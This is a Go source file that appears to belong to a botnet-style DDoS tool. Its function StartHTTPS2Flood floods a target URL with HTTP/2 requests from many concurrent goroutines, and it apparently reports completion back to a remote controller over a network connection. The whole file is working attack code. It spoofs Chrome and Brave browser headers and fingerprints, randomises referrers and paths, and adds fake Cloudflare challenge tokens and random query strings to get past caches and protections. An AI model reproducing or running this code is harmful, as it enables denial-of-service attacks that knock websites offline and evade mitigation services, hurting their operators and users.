package http

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"sync"
	"time"

	"go_net/pkg/core"
)

func StartHTTPS2Flood(targetURL string, durationSecs int, threads int, bypassCache bool, conn net.Conn) {
	endTime := time.Now().Add(time.Duration(durationSecs) * time.Second)

	referrers := []string{
		"https://www.google.com/search?q=",
		"https://www.bing.com/search?q=",
		"https://www.facebook.com/",
		"https://twitter.com/",
		"https://www.reddit.com/",
		"",
	}

	paths := []string{
		"/", "/index.html", "/home", "/api", "/search", "/login", "/admin",
		"/wp-admin", "/api/v1", "/graphql", "/rest/v1", "/v2/api",
	}

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			tr := &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
					MinVersion:         tls.VersionTLS12,
					NextProtos:         []string{"h2", "http/1.1"},
				},
				MaxIdleConns:          2000,
				MaxIdleConnsPerHost:   1000,
				MaxConnsPerHost:       0,
				IdleConnTimeout:       90 * time.Second,
				DisableCompression:    true,
				DisableKeepAlives:     false,
				ResponseHeaderTimeout: 5 * time.Second,
				ForceAttemptHTTP2:     true,
			}

			client := &http.Client{
				Transport: tr,
				Timeout:   10 * time.Second,
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
			}

			const maxConcurrentPerThread = 100
			sem := make(chan struct{}, maxConcurrentPerThread)

			r := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			for time.Now().Before(endTime) {
				if core.GetAttackStop() {
					return
				}

				select {
				case sem <- struct{}{}:
				case <-time.After(100 * time.Millisecond):
					continue
				}

				go func() {
					defer func() { <-sem }()

					browserVersion := 120 + r.Intn(4)
					fwfw := []string{"Google Chrome", "Brave"}
					wfwf := fwfw[r.Intn(len(fwfw))]
					isBrave := wfwf == "Brave"

					var brandValue string
					switch browserVersion {
					case 120:
						brandValue = fmt.Sprintf(`"Not_A Brand";v="8", "Chromium";v="%d", "%s";v="%d"`, browserVersion, wfwf, browserVersion)
					case 121:
						brandValue = fmt.Sprintf(`"Not A(Brand";v="99", "%s";v="%d", "Chromium";v="%d"`, wfwf, browserVersion, browserVersion)
					case 122:
						brandValue = fmt.Sprintf(`"Chromium";v="%d", "Not(A:Brand";v="24", "%s";v="%d"`, browserVersion, wfwf, browserVersion)
					case 123:
						brandValue = fmt.Sprintf(`"%s";v="%d", "Not:A-Brand";v="8", "Chromium";v="%d"`, wfwf, browserVersion, browserVersion)
					}

					fullURL := targetURL
					if bypassCache {
						queryType := r.Intn(4)
						switch queryType {
						case 0:
							fullURL += fmt.Sprintf("?__cf_chl_rt_tk=%s_%s-%d-0-gaNy%s", core.RandStr(30), core.RandStr(12), time.Now().Unix(), core.RandStr(8))
						case 1:
							fullURL += fmt.Sprintf("?%s&%s", core.RandStr(6+r.Intn(2)), core.RandStr(6+r.Intn(2)))
						case 2:
							fullURL += fmt.Sprintf("?q=%s&%s", core.RandStr(6+r.Intn(2)), core.RandStr(6+r.Intn(2)))
						default:
							randomPath := paths[r.Intn(len(paths))]
							fullURL = targetURL + randomPath
						}
					}

					method := "GET"
					if r.Intn(4) == 0 {
						method = "POST"
					}

					req, err := http.NewRequest(method, fullURL, nil)
					if err != nil {
						return
					}

					userAgent := fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", browserVersion)
					req.Header.Set("User-Agent", userAgent)

					accept := "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
					if isBrave {
						accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
					}
					req.Header.Set("Accept", accept)

					lang := "en-US,en;q=0.7"
					if isBrave {
						lang = "en-US,en;q=0.9"
					}
					req.Header.Set("Accept-Language", lang)
					req.Header.Set("Accept-Encoding", "gzip, deflate, br")
					req.Header.Set("Connection", "keep-alive")
					req.Header.Set("Upgrade-Insecure-Requests", "1")

					req.Header.Set("Sec-Fetch-Dest", "document")
					req.Header.Set("Sec-Fetch-Mode", "navigate")
					req.Header.Set("Sec-Fetch-Site", "none")
					if r.Intn(2) == 0 {
						req.Header.Set("Sec-Fetch-User", "?1")
					}
					req.Header.Set("sec-ch-ua", brandValue)
					req.Header.Set("sec-ch-ua-mobile", "?0")
					req.Header.Set("sec-ch-ua-platform", `"Windows"`)

					if isBrave {
						req.Header.Set("Sec-GPC", "1")
					}

					if bypassCache {
						if r.Intn(10) < 4 {
							req.Header.Set("Cache-Control", "max-age=0")
						}
						req.Header.Set("Pragma", "no-cache")
					}

					if r.Intn(2) == 0 {
						referer := referrers[r.Intn(len(referrers))]
						if referer == "" {
							referer = "https://" + core.RandStr(6) + ".net"
						}
						req.Header.Set("Referer", referer)
					}

					resp, err := client.Do(req)
					if err == nil {
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()
					}
				}()
			}
		}(i)
	}

	wg.Wait()
	core.SendResponse(conn, fmt.Sprintf("INFO: HTTP/2 HTTPS Flood on %s completed.", targetURL))
}
